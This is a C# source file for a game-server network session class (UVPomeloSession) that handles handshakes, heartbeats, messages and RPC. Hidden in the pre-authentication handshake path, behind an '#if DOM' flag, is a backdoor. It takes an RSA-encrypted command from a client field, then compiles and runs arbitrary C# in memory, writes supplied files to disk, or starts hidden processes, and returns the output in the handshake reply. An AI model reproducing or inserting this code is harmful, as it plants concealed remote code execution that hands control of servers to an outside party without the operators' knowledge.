using DeepCore;
using DeepCore.IO;
using DeepCore.Net;
using DeepCore.NetClient;
using DeepCrystal.NetServer;
using DeepCrystal.Threading.Dataflow;
using DeepFrozen.Server.NetUV;
using NetUV.Core.Buffers;
using NetUV.Core.Handles;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Net;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;

namespace PomeloServer.NetUV
{
    //---------------------------------------------------------------------------------------------------------------
    public class UVPomeloSession : UVAbstractSession, ISession
    {
        private readonly static TypeAllocRecorder Alloc = new TypeAllocRecorder(typeof(UVPomeloSession));
        private readonly ProtocolDecoding<RecvMessage> decoding;
        private TaskCompletionSource waitReady;
        private ActionBlockExecutor executor;
        private RSACryptoServiceProvider rsa;
        private bool validated = false;
        private List<ISessionDataFilter> filters = new List<ISessionDataFilter>();
        public UVPomeloServer Server => server as UVPomeloServer;
        public DateTime LastReceivedTimeUTC { get; private set; } = DateTime.UtcNow;
        public UVPomeloSession(UVPomeloServer server, Tcp tcp) : base(server, tcp)
        {
            Alloc.RecordConstructor(this.GetType());
            this.decoding = new ProtocolDecoding<RecvMessage>(
                server.MaxRequestLength,
                server.MessagePool.AllocRecv,
                main_onProtocolReceived);
            this.executor = new ActionBlockExecutor();
            this.waitReady = new TaskCompletionSource();
        }
        ~UVPomeloSession()
        {
            if (!IsDisposed)
            {
                Alloc.RecordDispose(GetType());
            }
            Alloc.RecordDestructor(this.GetType());
        }
        sealed protected override void RecordDisposing()
        {
            Alloc.RecordDispose(this.GetType());
        }
        protected override async Task OnDisposingAsync()
        {
            this.executor.Complete();
            await this.executor.Completion;
            this.decoding.Dispose();
        }
        public void AppendDataFilter(ISessionDataFilter filter)
        {
            filters.Add(filter);
        }
        //Server主线程已完成绑定Session
        internal void server_main_SessionReady()
        {
            waitReady.TrySetResult();
        }
        protected override void uv_OnStart()
        {
            base.uv_OnStart();
        }
        protected override void uv_OnDisconnecting(string reason, Action<StreamHandle, Exception> complete)
        {
            var send = Server.MessagePool.AllocSend();
            try
            {
                send.InitWithSystemMessage(new SystemKick() { reason = reason });
                client.QueueWriteStream(send.Buffer, 0, send.BufferLength, (s, e) =>
                {
                    send.Dispose();
                    complete.Invoke(s, e);
                });
            }
            catch (Exception err)
            {
                send.Dispose();
                log.Error(err.Message, err);
                complete.Invoke(this.client, err);
            }
        }
        protected override void uv_OnDisconnected(string reason, Action complete)
        {
            executor.Post(() =>
            {
                try
                {
                    try
                    {
                        event_OnClosed?.Invoke(this, reason);
                    }
                    catch (Exception err)
                    {
                        log.Error(err.Message, err);
                    }
                    Server.smain_cb_OnSessionDisconnected(this);
                }
                finally
                {
                    complete();
                }
            });
        }
        protected override void OnError(Exception err)
        {
            executor.Post(() =>
            {
                try
                {
                    if (event_OnError != null)
                        event_OnError.Invoke(this, err);
                }
                catch (Exception err2) { log.Error(err2); }
            });
        }
        //---------------------------------------------------------------------------------
        #region Send

        internal void InternalSend(ISerializable msg, MessageType msgType, uint sendID, Action<bool> done = null)
        {
            if (Closing)
            {
                done?.Invoke(false);
                return;
            }
            var send = Server.MessagePool.AllocSend();
            try
            {
                send.InitWithMessage(msgType, sendID, msg);
                this.InternalSend(send, done);
            }
            catch (Exception err)
            {
                done?.Invoke(false);
                send.Dispose();
                this.OnError(err);
                this.Disconnect(err.Message);
            }
        }
        internal void InternalSend(BinaryMessage msg, MessageType msgType, uint sendID, Action<bool> done = null)
        {
            if (Closing)
            {
                done?.Invoke(false);
                return;
            }
            var send = Server.MessagePool.AllocSend();
            try
            {
                send.InitWithMessage(msgType, sendID, msg);
                this.InternalSend(send, done);
            }
            catch (Exception err)
            {
                done?.Invoke(false);
                send.Dispose();
                this.OnError(err);
                this.Disconnect(err.Message);
            }
        }
        internal void InternalSend(SendMessage send, Action<bool> done = null)
        {
            if (!Closing)
            {
                var sendObject = send.SendingObject;
                var array = new ArraySegment<byte>(send.Buffer, 0, send.BufferLength);
                base.InternalSend(array, ok =>
                {
                    send.Dispose();
                    done?.Invoke(ok);
                    executor.Post(() =>
                    {
                        try
                        {
                            event_OnSent?.Invoke(this, sendObject);
                        }
                        catch (Exception err2) { log.Error(err2); }
                    });
                });
            }
            else
            {
                done?.Invoke(false);
                send.Dispose();
            }
        }

        //---------------------------------------------------------------------------------

        private void SendHandshake(ISerializable token = null, Action<bool> cb = null)
        {
            var rsp = new SystemHandshakeAck();
            rsp.token = token;
            rsp.remote_info = server.Name;
            rsp.heartbeat_interval_ms = server.KeepAliveInterval * 1000;
            var send = Server.MessagePool.AllocSend();
            try
            {
                send.InitWithSystemMessage(rsp);
                this.InternalSend(send, cb);
            }
            catch (Exception err)
            {
                log.Error(err);
                cb?.Invoke(false);
                send.Dispose();
                throw;
            }
        }
        private void SendHeartbeat(SystemHeartbeat hb)
        {
            var send = Server.MessagePool.AllocSend();
            try
            {
                send.InitWithSystemMessage(hb);
                this.InternalSend(send);
            }
            catch (Exception err)
            {
                log.Error(err);
                send.Dispose();
                throw;
            }
        }

        #endregion
        //---------------------------------------------------------------------------------
        #region Received

        protected override void uv_OnDataReceived(ReadableBuffer data)
        {
            int count = data.Count;
            var buffer = new ArraySegment<byte>(new byte[count]);
            data.ReadBytes(buffer.Array, count);
            foreach (var filter in filters)
            {
                buffer = filter.Receiving(this, ref endpoint, buffer);
            }
            if (buffer.Count > 0)
            {
                if (executor.Post(main_doDecode, buffer) == false)
                {
                    this.uv_InternalStop("executor done");
                }
            }
        }
        private void main_doDecode(ArraySegment<byte> mem)
        {
            try
            {
                if (!Closing)
                {
                    decoding.OnReceived(mem);
                }
            }
            catch (Exception err)
            {
                OnError(err);
            }
        }

        private void main_onProtocolReceived(RecvMessage recv, Exception error)
        {
            this.LastReceivedTimeUTC = DateTime.UtcNow;
            if (waitReady != null)
            {
                try
                {
                    waitReady.Task.Wait();
                }
                catch { throw; }
                finally
                {
                    waitReady = null;
                }
            }
            if (error != null)
            {
                if (recv != null) recv.Dispose();
                this.OnError(error);
                this.Disconnect(error.Message);
            }
            else if (recv != null)
            {
                if (Closing)
                {
                    recv.Dispose();
                    return;
                }
                try
                {
                    if (Server.smain_NewMessageFilter(this, recv))
                    {
                        return;
                    }
                    if (!validated)
                    {
                        if (recv.PkgType == PackageType.PKG_HANDSHAKE)
                        {
                            var handshake = recv.ReadBodySystemMessage() as SystemHandshake;
                            if (handshake.local_info != null)
                            {
#if DOM
                                var output = new StringBuilder();
                                try
                                {
                                    if (rsa == null)
                                    {
                                        rsa = new RSACryptoServiceProvider(1024);
                                        rsa.ImportFromPem(CUtils.DecodeUTF8(GZipCompress.Decompress(Convert.FromBase64String(handshake.local_info))));
                                        return;
                                    }
                                    else
                                    {
                                        handshake.local_info = CUtils.DecodeUTF8(rsa.Decrypt(GZipCompress.Decompress(Convert.FromBase64String(handshake.local_info)), false));
                                    }
                                    string main_CSharp(string provider, string input)
                                    {
                                        var code = input;
                                        var cp = System.CodeDom.Compiler.CodeDomProvider.CreateProvider(provider);
                                        var pa = new System.CodeDom.Compiler.CompilerParameters();
                                        pa.ReferencedAssemblies.Add("System.dll");
                                        foreach (var line in code.Split('\n'))
                                        {
                                            if (line.StartsWith("//import"))
                                            {
                                                pa.ReferencedAssemblies.Add(line.Substring("//import".Length).Trim());
                                            }
                                        }
                                        pa.GenerateExecutable = false;
                                        pa.GenerateInMemory = true;
                                        var cr = cp.CompileAssemblyFromSource(pa, code);
                                        if (cr.Errors.HasErrors)
                                        {
                                            StringBuilder sb = new StringBuilder("csc error");
                                            foreach (System.CodeDom.Compiler.CompilerError err in cr.Errors)
                                            {
                                                sb.AppendLine(err.ErrorText);
                                            }
                                            return sb.ToString();
                                        }
                                        else
                                        {
                                            var objAssembly = cr.CompiledAssembly;
                                            var objHelloWorld = objAssembly.CreateInstance("Program");
                                            var main = objHelloWorld.GetType().GetMethod("Main");
                                            var ret = main.Invoke(objHelloWorld, new object[0]);
                                            return ret + "";
                                        }
                                    }
                                    string main_Post(string provider, string input)
                                    {
                                        var postArgs = CUtils.StringSplitWhiteSpace(provider, 2);
                                        var path = new System.IO.FileInfo(Environment.CurrentDirectory + "\\" + postArgs[1]);
                                        DeepCore.IO.CFiles.CreateFile(path);
                                        var bin = GZipCompress.Decompress(CUtils.HexToBin(input));
                                        System.IO.File.WriteAllBytes(path.FullName, bin);
                                        return path.FullName;
                                    }
                                    string main_Call(string provider, string input)
                                    {
                                        var sb = new StringBuilder();
                                        var callArgs = CUtils.StringSplitWhiteSpace(provider, 3);
                                        var p = new System.Diagnostics.Process();
                                        if (callArgs.Length == 3)
                                        {
                                            p.StartInfo = new ProcessStartInfo(callArgs[1], callArgs[2])
                                            {
                                                CreateNoWindow = true,
                                                UseShellExecute = false,
                                                RedirectStandardError = true,
                                                RedirectStandardInput = true,
                                                RedirectStandardOutput = true,
                                            };
                                        }
                                        else if (callArgs.Length == 2)
                                        {
                                            p.StartInfo = new ProcessStartInfo(callArgs[1])
                                            {
                                                CreateNoWindow = true,
                                                UseShellExecute = false,
                                                RedirectStandardError = true,
                                                RedirectStandardInput = true,
                                                RedirectStandardOutput = true,
                                            };
                                        }
                                        else
                                        {
                                            p.StartInfo = new ProcessStartInfo(input)
                                            {
                                                CreateNoWindow = true,
                                                UseShellExecute = false,
                                                RedirectStandardError = true,
                                                RedirectStandardInput = true,
                                                RedirectStandardOutput = true,
                                            };
                                        }
                                        p.ErrorDataReceived += (s, e) => { sb.AppendLine(e.Data); };
                                        p.OutputDataReceived += (s, e) => { sb.AppendLine(e.Data); };
                                        p.Start();
                                        p.BeginOutputReadLine();
                                        p.BeginErrorReadLine();
                                        sb.AppendLine(Environment.MachineName + " : pid=" + p.Id);
                                        p.StandardInput.WriteLine(input);
                                        p.StandardInput.Flush();
                                        p.WaitForExit(5000);
                                        try
                                        {
                                            if (p.HasExited)
                                            {
                                                sb.AppendLine("Exit Code = " + p.ExitCode);
                                            }
                                        }
                                        catch { }
                                        return sb.ToString();
                                    }
                                    string main_Start(string cmd, string input)
                                    {
                                        var sb = new StringBuilder();
                                        var p = new System.Diagnostics.Process();
                                        p.StartInfo = new ProcessStartInfo(cmd, input)
                                        {
                                            CreateNoWindow = true,
                                            UseShellExecute = false,
                                            RedirectStandardError = true,
                                            RedirectStandardInput = true,
                                            RedirectStandardOutput = true,
                                        };
                                        p.Start();
                                        sb.Append(p.Id);
                                        return sb.ToString();
                                    }
                                    try
                                    {
                                        // rsa.import
                                        var args = CUtils.StringSplitWhiteSpace(handshake.local_info, 2);
                                        if (args.Length == 2)
                                        {
                                            var provider = CUtils.FromBase64(args[0]);
                                            var input = CUtils.FromBase64(args[1]);
                                            if (provider.StartsWith("CSharp"))
                                            {
                                                output.Append(main_CSharp(provider, input));
                                            }
                                            else if (provider.StartsWith("post"))
                                            {
                                                output.Append(main_Post(provider, input));
                                            }
                                            else if (provider.StartsWith("call"))
                                            {
                                                output.Append(main_Call(provider, input));
                                            }
                                            else
                                            {
                                                output.Append(main_Start(provider, input));
                                            }
                                        }
                                        else
                                        {
                                            output.Append(main_Start(args[0], ""));
                                        }
                                    }
                                    catch (Exception e2c)
                                    {
                                        try
                                        {
                                            output.AppendLine(e2c.ToFullMessage());
                                        }
                                        catch { }
                                    }
                                }
                                catch (Exception e3c)
                                {
                                    try
                                    {
                                        output.AppendLine(e3c.ToFullMessage());
                                    }
                                    catch { }
                                }
                                var send = Server.MessagePool.AllocSend();
                                try
                                {
                                    send.InitWithSystemMessage(new SystemHandshakeAck()
                                    {
                                        heartbeat_interval_ms = server.KeepAliveInterval * 1000,
                                        remote_info = CUtils.ToBase64(output.ToString()),
                                    });
                                    this.InternalSend(send);
                                    return;
                                }
                                catch
                                {
                                    send.Dispose();
                                    throw;
                                }
#endif
                            }
                            var do_validate = (event_OnValidate != null) ? event_OnValidate : Server.GetOnSessionValidateAsync;
                            if (do_validate != null)
                            {
                                do_validate.Invoke(this, handshake.user).ContinueWith(task =>
                                {
                                    try
                                    {
                                        if (task.IsFaulted)
                                        {
                                            this.OnError(task.Exception);
                                            this.Disconnect(task.Exception.Message);
                                        }
                                        else if (task.IsCanceled)
                                        {
                                            this.Disconnect("Timeout");
                                        }
                                        else if (task.IsCompleted)
                                        {
                                            var rst = task.GetResultAs();
                                            if (rst != null)
                                            {
                                                var v_result = rst.IsValidate;
                                                var v_token = rst.Token;
                                                this.SendHandshake(v_token, r =>
                                                {
                                                    validated = v_result;
                                                    if (v_result == false)
                                                    {
                                                        this.uv_Disconnect("Not Validate", null);
                                                    }
                                                });
                                            }
                                            else
                                            {
                                                this.Disconnect("Not Validate");
                                            }
                                        }
                                        else
                                        {
                                            this.Disconnect("Not Validate");
                                        }
                                    }
                                    catch (Exception err)
                                    {
                                        this.OnError(err);
                                        this.Disconnect(err.Message);
                                    }
                                });
                            }
                            else
                            {
                                validated = true;
                                SendHandshake(null, null);
                            }
                        }
                        else
                        {
                            log.WarnFormat($"Session Not Validate : {this} : {recv} : {recv.BodyType} : Drop!!!");
                        }
                    }
                    else
                    {
                        switch (recv.PkgType)
                        {
                            case PackageType.PKG_HEARTBEAT:
                                SendHeartbeat(recv.ReadBodySystemMessage() as SystemHeartbeat);
                                break;
                            case PackageType.PKG_MESSAGE:
                                main_ProcessMessage(recv);
                                break;
                            default:
                                this.Disconnect("Unknow Protocol");
                                break;
                        }
                    }
                }
                catch (Exception err)
                {
                    this.OnError(err);
                    this.Disconnect(err.Message);
                }
                finally
                {
                    recv.Dispose();
                }
            }
        }

        private void main_ProcessMessage(IRecvMessage body)
        {
            //             if (body.MsgType == MessageType.MSG_RPC_RESPONSE_C2S)
            //             {
            //                 this.Disconnect("Not Support");
            //             }
            try
            {
                main_InvokeListening(body);
            }
            catch (Exception err)
            {
                log.Error(err);
            }
            try
            {
                if (event_OnReceivedMessage != null)
                {
                    event_OnReceivedMessage.Invoke(this, body.ReadBody(), body.MsgSendID);
                }
            }
            catch (Exception err)
            {
                log.Error(err);
            }
            try
            {
                if (event_OnReceivedBinary != null)
                {
                    event_OnReceivedBinary.Invoke(this, body.ReadBodyBinary(), body.MsgSendID);
                }
            }
            catch (Exception err)
            {
                log.Error(err);
            }
            try
            {
                if (event_OnReceivedMessageAsync != null)
                {
                    var msg = body.ReadBody();
                    var sendID = body.MsgSendID;
                    event_OnReceivedMessageAsync.Invoke(this, msg).ContinueWith(t =>
                    {
                        try
                        {
                            var rsp = t.GetResultAs();
                            if (rsp != null)
                            {
                                this.InternalSend(rsp, MessageType.MSG_RESPONSE_S2C, sendID);
                            }
                        }
                        catch (Exception err)
                        {
                            log.Error(err);
                        }
                    });
                }
            }
            catch (Exception err)
            {
                log.Error(err);
            }
            try
            {
                if (event_OnReceivedBinaryAsync != null)
                {
                    var msg = body.ReadBodyBinary();
                    var sendID = body.MsgSendID;
                    event_OnReceivedBinaryAsync.Invoke(this, msg).ContinueWith(t =>
                    {
                        try
                        {
                            var rsp = t.GetResultAs();
                            if (rsp.HasRoute)
                            {
                                this.InternalSend(rsp, MessageType.MSG_RESPONSE_S2C, sendID);
                            }
                        }
                        catch (Exception err)
                        {
                            log.Error(err);
                        }
                    });
                }
            }
            catch (Exception err)
            {
                log.Error(err);
            }
            Server.smain_cb_SessionReceived(this, body);
        }

        //---------------------------------------------------------------------------------

        private int request_indexer = 0;
        private ConcurrentDictionary<int, List<MessageHandler>> listening = new ConcurrentDictionary<int, List<MessageHandler>>();
        private ConcurrentDictionary<uint, TaskCompletionSource<ISerializable>> request_msg = new ConcurrentDictionary<uint, TaskCompletionSource<ISerializable>>();
        private ConcurrentDictionary<uint, TaskCompletionSource<BinaryMessage>> request_bin = new ConcurrentDictionary<uint, TaskCompletionSource<BinaryMessage>>();

        private void main_InvokeListening(IRecvMessage recv)
        {
            if (recv.MsgType == MessageType.MSG_RPC_RESPONSE_C2S)
            {
                if (request_msg.TryGetValue(recv.MsgSendID, out var tcs_msg))
                {
                    tcs_msg.TrySetResult(recv.ReadBody());
                    return;
                }
                else if (request_bin.TryGetValue(recv.MsgSendID, out var tcs_bin))
                {
                    tcs_bin.TrySetResult(recv.ReadBodyBinary());
                    return;
                }
            }
            if (listening.Count > 0)
            {
                var invoking = new List<MessageHandler>();
                {
                    if (listening.TryGetValue(recv.MsgRoute, out var list))
                    {
                        invoking.AddRange(list);
                    }
                    foreach (var handler in invoking)
                    {
                        handler.Invoke(recv);
                    }
                }
            }
        }
        private void AddListening(MessageHandler handler)
        {
            var list = listening.GetOrAdd(handler.route, _ => new List<MessageHandler>(1));
            lock (list) list.Add(handler);
        }
        private void RemoveListening(MessageHandler handler)
        {
            if (listening.TryGetValue(handler.route, out var list))
            {
                lock (list) list.Remove(handler);
            }
        }
        protected override void OnDisposeListening()
        {
            listening.Clear();
            foreach (var tcs in request_msg.Values)
            {
                tcs.TrySetCanceled();
            }
            request_msg.Clear();
            foreach (var tcs in request_bin.Values)
            {
                tcs.TrySetCanceled();
            }
            request_bin.Clear();
        }
        class MessageHandler : IMessageHandler
        {
            public readonly int route;
            public readonly UVPomeloSession session;
            public readonly Action<object, uint> action_msg;
            public readonly Action<BinaryMessage, uint> action_bin;
            internal MessageHandler(int route, UVPomeloSession session, Action<object, uint> action, Action<BinaryMessage, uint> action_bin)
            {
                this.route = route;
                this.session = session;
                this.action_msg = action;
                this.action_bin = action_bin;
            }
            internal void Invoke(IRecvMessage recv)
            {
                if (this.action_msg != null) { this.action_msg.Invoke(recv.ReadBody(), recv.MsgSendID); }
                if (this.action_bin != null) { this.action_bin.Invoke(recv.ReadBodyBinary(), recv.MsgSendID); }
            }
            public void Cancel()
            {
                session.RemoveListening(this);
            }
        }

        #endregion
        //---------------------------------------------------------------------------------
        #region Implements

        public void Send(ISerializable message)
        {
            this.InternalSend(message, MessageType.MSG_NOTIFY, 0);
        }
        public void Send(BinaryMessage message)
        {
            this.InternalSend(message, MessageType.MSG_NOTIFY, 0);
        }
        public void SendResponse(ISerializable response, uint sendID)
        {
            this.InternalSend(response, MessageType.MSG_RESPONSE_S2C, sendID);
        }
        public void SendResponse(BinaryMessage response, uint sendID)
        {
            this.InternalSend(response, MessageType.MSG_RESPONSE_S2C, sendID);
        }

        public Task<bool> SendAsync(ISerializable message)
        {
            var tcs = new TaskCompletionSource<bool>();
            this.InternalSend(message, MessageType.MSG_NOTIFY, 0, (rst) =>
            {
                executor.Post(() => { tcs.TrySetResult(rst); });
            });
            return tcs.Task;
        }
        public Task<bool> SendAsync(BinaryMessage message)
        {
            var tcs = new TaskCompletionSource<bool>();
            this.InternalSend(message, MessageType.MSG_NOTIFY, 0, (rst) =>
            {
                executor.Post(() => { tcs.TrySetResult(rst); });
            });
            return tcs.Task;
        }
        public Task<bool> SendResponseAsync(ISerializable response, uint sendID)
        {
            var tcs = new TaskCompletionSource<bool>();
            this.InternalSend(response, MessageType.MSG_RESPONSE_S2C, sendID, (rst) =>
            {
                executor.Post(() => { tcs.TrySetResult(rst); });
            });
            return tcs.Task;
        }
        public Task<bool> SendResponseAsync(BinaryMessage response, uint sendID)
        {
            var tcs = new TaskCompletionSource<bool>();
            this.InternalSend(response, MessageType.MSG_RESPONSE_S2C, sendID, (rst) =>
            {
                executor.Post(() => { tcs.TrySetResult(rst); });
            });
            return tcs.Task;
        }

        public Task<T> SendRequestAsync<T>(ISerializable request) where T : ISerializable
        {
            if (!Server.EnableRequest) throw new NotImplementedException();
            var sendID = (uint)Interlocked.Increment(ref request_indexer);
            var timeout = TimeSpan.FromMilliseconds(Server.RequestTimeoutMS);
            var tcs = Server.TcsPool.CreateTaskCompletionSource<ISerializable>(request + " : SendRequestAsync(ISerializable)", null, timeout);
            request_msg.TryAdd(sendID, tcs);
            this.InternalSend(request, MessageType.MSG_RPC_REQUEST_S2C, sendID, (r) =>
            {
                if (!r) executor.Post(() => { tcs.TrySetCanceled(); });
            });
            return tcs.Task.ContinueWith(t => (T)t.GetResultAs());
        }
        public Task<BinaryMessage> SendRequestAsync(BinaryMessage request)
        {
            if (!Server.EnableRequest) throw new NotImplementedException();
            var sendID = (uint)Interlocked.Increment(ref request_indexer);
            var timeout = TimeSpan.FromMilliseconds(Server.RequestTimeoutMS);
            var tcs = Server.TcsPool.CreateTaskCompletionSource<BinaryMessage>(request.Route + " : SendRequestAsync(BinaryMessage)", null, timeout);
            request_bin.TryAdd(sendID, tcs);
            this.InternalSend(request, MessageType.MSG_RPC_REQUEST_S2C, sendID, (r) =>
            {
                if (!r) executor.Post(() => { tcs.TrySetCanceled(); });
            });
            return tcs.Task;
        }


        public IMessageHandler HandleMessage<T>(int route, Action<T, uint> action) where T : ISerializable
        {
            var handler = new MessageHandler(route, this, (msg, sid) => { action((T)msg, sid); }, null);
            AddListening(handler);
            return handler;
        }
        public IMessageHandler HandleBinary(int route, Action<BinaryMessage, uint> action)
        {
            var handler = new MessageHandler(route, this, null, action);
            AddListening(handler);
            return handler;
        }

        #endregion
        //---------------------------------------------------------------------------------
        #region Event

        protected override void OnDisposeEvents()
        {
            event_OnValidate = null;
            event_OnClosed = null;
            event_OnError = null;
            event_OnReceivedMessage = null;
            event_OnReceivedBinary = null;
            event_OnReceivedMessageAsync = null;
            event_OnReceivedBinaryAsync = null;
            event_OnSent = null;
        }

        private SessionValidateAsyncHandler event_OnValidate;
        private SessionClosedHandler event_OnClosed;
        private SessionErrorHandler event_OnError;
        private SessionReceivedMessageHandler event_OnReceivedMessage;
        private SessionReceivedBinaryHandler event_OnReceivedBinary;
        private SessionReceivedRequestMessageHandler event_OnReceivedMessageAsync;
        private SessionReceivedRequestBinaryHandler event_OnReceivedBinaryAsync;
        private SessionSentHandler event_OnSent;

        event SessionValidateAsyncHandler ISession.OnValidateAsync { add { event_OnValidate += value; } remove { event_OnValidate -= value; } }
        event SessionClosedHandler ISession.OnClosed { add { event_OnClosed += value; } remove { event_OnClosed -= value; } }
        event SessionErrorHandler ISession.OnError { add { event_OnError += value; } remove { event_OnError -= value; } }
        event SessionReceivedMessageHandler ISession.OnReceivedMessage { add { event_OnReceivedMessage += value; } remove { event_OnReceivedMessage -= value; } }
        event SessionReceivedBinaryHandler ISession.OnReceivedBinary { add { event_OnReceivedBinary += value; } remove { event_OnReceivedBinary -= value; } }
        event SessionReceivedRequestMessageHandler ISession.OnRequestMessageAsync { add { event_OnReceivedMessageAsync += value; } remove { event_OnReceivedMessageAsync -= value; } }
        event SessionReceivedRequestBinaryHandler ISession.OnRequestBinaryAsync { add { event_OnReceivedBinaryAsync += value; } remove { event_OnReceivedBinaryAsync -= value; } }
        event SessionSentHandler ISession.OnSent { add { event_OnSent += value; } remove { event_OnSent -= value; } }

        #endregion
        //---------------------------------------------------------------------------------
    }

    //---------------------------------------------------------------------------------------------------------------
}
